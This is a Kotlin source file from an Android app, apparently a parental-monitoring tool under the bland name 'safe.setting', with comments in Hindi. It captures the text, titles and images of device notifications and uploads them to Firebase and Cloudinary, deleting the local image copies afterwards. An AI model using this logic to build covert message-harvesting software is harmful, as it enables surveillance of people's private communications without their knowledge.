package com.safe.setting.app.services.notificationService

import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.util.Log
import androidx.annotation.RequiresApi
import com.safe.setting.app.data.model.NotificationMessages
import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
import com.safe.setting.app.utils.ConstFun.getDateTime
import com.safe.setting.app.utils.Consts
import com.safe.setting.app.utils.Consts.CHILD_PERMISSION
import com.safe.setting.app.utils.Consts.DATA
import com.safe.setting.app.utils.Consts.NOTIFICATION_MESSAGE
import com.safe.setting.app.utils.FileHelper
import com.safe.setting.app.utils.FileHelper.getFileNameBitmap
import com.safe.setting.app.utils.CloudinaryManager
import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers
import io.reactivex.rxjava3.disposables.CompositeDisposable
import io.reactivex.rxjava3.schedulers.Schedulers
import java.io.File // 1. java.io.File को इम्पोर्ट करें
import javax.inject.Inject

class InteractorNotificationService @Inject constructor(private val context: Context, private val firebase: InterfaceFirebase) : InterfaceNotificationListener {

    private var disposable: CompositeDisposable = CompositeDisposable()

    override fun setRunService(run: Boolean) {
        if (firebase.getUser()!=null) firebase.getDatabaseReference("$NOTIFICATION_MESSAGE/$CHILD_PERMISSION").setValue(run)
    }

    override fun getNotificationExists(id: String, exec: () -> Unit) {
        if (firebase.getUser()!=null) {
            disposable.add(firebase.queryValueEventSingle("$NOTIFICATION_MESSAGE/$DATA","nameImage",id)
                .map { value -> value.exists() }
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ if (!it) exec() },{ Log.e(Consts.TAG,it.message.toString()) }))
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    override fun setDataMessageNotification(type: Int, text: String?, title: String?, nameImage: String?, image:Bitmap?) {
        if (image!=null && nameImage != null){
            // 2. getFileNameBitmap अब फाइल का पथ (String) लौटाएगा
            val imageFilePath = image.getFileNameBitmap(context,nameImage)
            // 3. हम उस पथ से एक File ऑब्जेक्ट बनाएंगे
            val imageFile = File(imageFilePath)

            disposable.add(CloudinaryManager.uploadPhoto(imageFile) // अब यह सही से काम करेगा
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe({ url ->
                    // Cloudinary से URL मिलने के बाद डेटा सहेजें
                    setData(type,text,title,nameImage,url)
                    FileHelper.deleteFile(imageFilePath) // पथ का उपयोग करके फाइल डिलीट करें
                }, { error ->
                    Log.e(Consts.TAG, "Cloudinary Upload Error: ${error.message}")
                    FileHelper.deleteFile(imageFilePath) // पथ का उपयोग करके फाइल डिलीट करें
                })
            )

        } else {
            setData(type,text,title,"-","-")
        }
    }

    private fun setData(type: Int, text: String?, title: String?,nameImage:String?,urlImage:String?){
        val message = NotificationMessages(text,title,type,getDateTime(),nameImage,urlImage)
        firebase.getDatabaseReference("$NOTIFICATION_MESSAGE/$DATA").push().setValue(message)
    }
}
